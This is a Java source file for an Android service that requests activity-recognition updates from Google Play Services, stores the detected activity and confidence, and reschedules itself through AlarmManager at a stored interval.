package com.inet.android.location;

import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.ActivityRecognition;
import com.inet.android.request.ConstantValue;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * RecognitionDevService class is designed for start ACTIVITY_RECOGNITION
 * 
 * @author johny homicide
 * 
 */
public class RecognitionDevService extends Service implements
		GoogleApiClient.ConnectionCallbacks,
		GoogleApiClient.OnConnectionFailedListener {
	private BroadcastReceiver receiver;
	private String TAG = RecognitionDevService.class.getSimpleName();
	private static final int SERVICE_REQUEST_CODE = 27;
	private int timeUp = 0;
	private Context mContext;
	private GoogleApiClient googleApiClient;
	static String active;

	@Override
	public void onCreate() {
		super.onCreate();
		Logging.doLog(TAG, "RecognitionDevService onCreate()",
				"RecognitionDevService onCreate()");

		mContext = getApplicationContext();

		if (!servicesAvailable()) {
			stopSelf();
		}
		createApiGoogle();

		receiver = new BroadcastReceiver() {

			@Override
			public void onReceive(Context context, Intent intent) {
				String activity = intent.getStringExtra("Activity");
				if (!activity.equals(""))
					setActivityDevice("Активность :"
							+ intent.getStringExtra("Activity") + " "
							+ "Точность : "
							+ intent.getExtras().getInt("Confidence") + "\n");
				else
					setActivityDevice("");
				Logging.doLog(TAG, active, active);

			}
		};
		IntentFilter filter = new IntentFilter();
		filter.addAction("com.inet.android.location.ACTIVITY_RECOGNITION_DATA");
		registerReceiver(receiver, filter);
	}

	private void setActivityDevice(String activity) {
		RecognitionDevService.active = activity;
	}

	public static String getActivityDevice() {
		return RecognitionDevService.active;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		// ----------get geo time------------------------------
		Logging.doLog(TAG, "onStartCommand ActivityRecognitionClient",
				"onStartCommand ActivityRecognitionClient");
		timeUp = ValueWork.getState(ConstantValue.TYPE_LOCATION_TRACKER_REQUEST,
				this);
		
		if (timeUp == 0) {
			Logging.doLog(TAG, "ActivityRecognitionClient Stop",
					"ActivityRecognitionClient Stop");
			stopSelf();
			return 0;
		}
		// ----------restart service----------------------------

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(mContext,
						RecognitionDevService.class),// SERVICE_REQUEST_CODE
				// -
				// уникальный
				// int
				// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
		// ----------is work ---------------------------------------------------

		if (timeUp == 0)
			return 0;

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;

	}

	private boolean servicesAvailable() {
		int resultCode = GooglePlayServicesUtil
				.isGooglePlayServicesAvailable(mContext);
		if (ConnectionResult.SUCCESS == resultCode) {
			Logging.doLog(TAG, "Google Play services is available.",
					"Google Play services is available.");
			return true;
		}
		Logging.doLog(TAG, "Google Play services NOT available.",
				"Google Play services NOT available.");
		return false;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onConnectionFailed(ConnectionResult arg0) {
		// TODO Auto-generated method stub
		Logging.doLog(TAG, "onConnectionFailed", "onConnectionFailed");
		if(googleApiClient != null)
			googleApiClient.disconnect();
	}

	private void createApiGoogle() {
		googleApiClient = new GoogleApiClient.Builder(this)
				.addApi(ActivityRecognition.API).addConnectionCallbacks(this)
				.addOnConnectionFailedListener(this).build();
		googleApiClient.connect();
	}

	@Override
	public void onConnected(Bundle arg0) {
		// TODO Auto-generated method stub
		Intent intent = new Intent(this, ActivityRecognitionService.class);
		Logging.doLog(TAG, "onConnected", "onConnected");

		PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent,
				PendingIntent.FLAG_UPDATE_CURRENT);
		ActivityRecognition.ActivityRecognitionApi.requestActivityUpdates(
				googleApiClient, timeUp * 1000 * 60, pendingIntent);

	}

	@Override
	public void onConnectionSuspended(int arg0) {
		// TODO Auto-generated method stub

	}
}
